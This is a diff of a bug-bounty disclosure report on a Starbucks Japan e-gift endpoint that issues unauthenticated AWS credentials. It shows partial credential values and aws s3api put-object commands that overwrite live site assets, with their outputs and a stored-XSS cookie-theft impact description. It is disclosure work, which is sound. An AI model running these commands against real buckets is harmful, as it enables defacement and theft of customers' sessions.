@@ -1,22 +1,23 @@
 ---
-attachments: [Screenshot 2025-02-03 at 2.23.15 AM.png]
-title: 'Stored XSS: Misconfigured endpoint allows generation of AWS creds for arbitrary file upload to user-specified S3 bucket and path'
-created: '2025-02-02T15:19:04.993Z'
-modified: '2025-02-03T05:18:21.145Z'
+title: Starbucks Japan 03/02/2025
+created: "2025-02-02T15:19:04.993Z"
+modified: "2025-02-03T05:21:39.329Z"
 ---
 
-# Stored XSS: Misconfigured endpoint allows generation of AWS creds for arbitrary file upload to user-specified S3 bucket and path
+# Starbucks Japan 03/02/2025
 
-## Starbucks Japan 03/02/2025
+## Stored XSS: Misconfigured endpoint allows generation of AWS creds for arbitrary file upload to user-specified S3 bucket and path
 
-## Summary:
+## Summary
+
 - This vulnerability allows unauthenticated users to generate temporary AWS creds for arbitrary file upload to user-specified S3 bucket and path
 - Existing assets at gift.starbucks.co.jp can be overwritten by the user and replaced with malicious files to engage a stored XSS attack against any customers visiting the site, for example, retrieving session IDs and other cookies to perform actions on behalf of other customers and/or accessing sensitive data (e.g. credit card info)
 - Malicious files could also be uploaded to strategic bucket/filepath locations in the hopes of company employees/engineers with S3 access accidentally downloading and/or executing them
 - The gift card service can also be interrupted by replacing the assets with empty/invalid files or otherwise offensive material
 
-## Steps To Reproduce:
-- Any unauthenticated user can navigate to https://www.starbucks.co.jp/group_egift/ and hit the `寄せ書きをつくる` button to generate a new group gift.
+## Steps To Reproduce
+
+- Any unauthenticated user can navigate to <https://www.starbucks.co.jp/group_egift/> and hit the `寄せ書きをつくる` button to generate a new group gift.
 
 - The user can then select the option to upload their own image for the card design.
 
@@ -39,10 +40,10 @@ X-Csrf-Token: T1ZpeY+3eDlS2...
 
 ```json
 {
-  "access_key_id":"ASIAXORN27VLT35SFYDM",
-  "secret_access_key":"FBYwhuhZoxay4kZ...",
-  "session_token":"IQoJb3JpZ2luX2VjEOj...",
-  "upload_file_name":"send_to/send_to-1738510879046...jpeg"
+  "access_key_id": "ASIAXORN27VLT35SFYDM",
+  "secret_access_key": "FBYwhuhZoxay4kZ...",
+  "session_token": "IQoJb3JpZ2luX2VjEOj...",
+  "upload_file_name": "send_to/send_to-1738510879046...jpeg"
 }
 ```
 
@@ -69,9 +70,9 @@ aws whoami
 
 ```json
 {
-    "UserId": "512270990679:sbj-egift-web",
-    "Account": "512270990679",
-    "Arn": "arn:aws:sts::512270990679:federated-user/sbj-egift-web"
+  "UserId": "512270990679:sbj-egift-web",
+  "Account": "512270990679",
+  "Arn": "arn:aws:sts::512270990679:federated-user/sbj-egift-web"
 }
 ```
 
@@ -83,13 +84,15 @@ aws s3api put-object \
   --key "hackerone/kryn3n/hacked.txt" \
   --body ./hacked.txt
 ```
+
 - Looks like the file was uploaded without any complaints.
+
 ```json
 {
-    "Expiration": "expiry-date=\"Sat, 15 Mar 2025 00:00:00 GMT\", rule-id=\"user-upload-images-lifecycle-rule\"",
-    "ETag": "\"9226b53bfe04b2aae262a6fdf26e9af5\"",
-    "ServerSideEncryption": "AES256",
-    "VersionId": "zDiSGKrV7v3h1NT_fPzfJLQVS3tNMJ3i"
+  "Expiration": "expiry-date=\"Sat, 15 Mar 2025 00:00:00 GMT\", rule-id=\"user-upload-images-lifecycle-rule\"",
+  "ETag": "\"9226b53bfe04b2aae262a6fdf26e9af5\"",
+  "ServerSideEncryption": "AES256",
+  "VersionId": "zDiSGKrV7v3h1NT_fPzfJLQVS3tNMJ3i"
 }
 ```
 
@@ -97,8 +100,9 @@ aws s3api put-object \
 
 ```bash
 curl prd-sbj-egift-user-images-draft.s3-ap-northeast-1.amazonaws.com/hackerone/kryn3n/hacked.txt \
-  -H "Referer:https://gift.starbucks.co.jp/" 
-````
+  -H "Referer:https://gift.starbucks.co.jp/"
+```
+
 ```
 you've been hacked :) [kryn3n@wearehackerone.com]
 ```
@@ -112,6 +116,7 @@ you've been hacked :) [kryn3n@wearehackerone.com]
   "filepath": "eg_cover_design_assets/touka_intro_cheers_2/celebrate02_select_thumb-120x160.gif"
 }
 ```
+
 - Exporting the new credentials, we can perform another `put-object` to overwrite the existing asset.
 
 ```bash
@@ -122,17 +127,19 @@ aws s3api put-object \
 ```
 
 - Again, the file is uploaded without an issue and successfully overwrites the existing asset.
+
 ```json
 {
-    "ETag": "\"09a5bc4683984718afe9688bdecc9ce2\"",
-    "ServerSideEncryption": "AES256"
+  "ETag": "\"09a5bc4683984718afe9688bdecc9ce2\"",
+  "ServerSideEncryption": "AES256"
 }
 ```
 
 ## Impact
 
-## Summary:
-- This is obviously a security risk as the gift card assets are loaded by anyone visiting the group gift creation page, which presents the opportunity of a stored XSS attack. With the ability to overwrite any of these assets with our own files we could potentially cause a script to run in another customer's browser/app to steal their session ID cookie and use that to perform actions against their account. 
+## Summary
+
+- This is obviously a security risk as the gift card assets are loaded by anyone visiting the group gift creation page, which presents the opportunity of a stored XSS attack. With the ability to overwrite any of these assets with our own files we could potentially cause a script to run in another customer's browser/app to steal their session ID cookie and use that to perform actions against their account.
 
 - An example of this could be overwriting one of the assets with a XML/SVG image containing an embedded malicious script as shown below. This way customers would not notice anything out of the ordinary when visiting the site as we could repurpose an existing SVG asset.
 
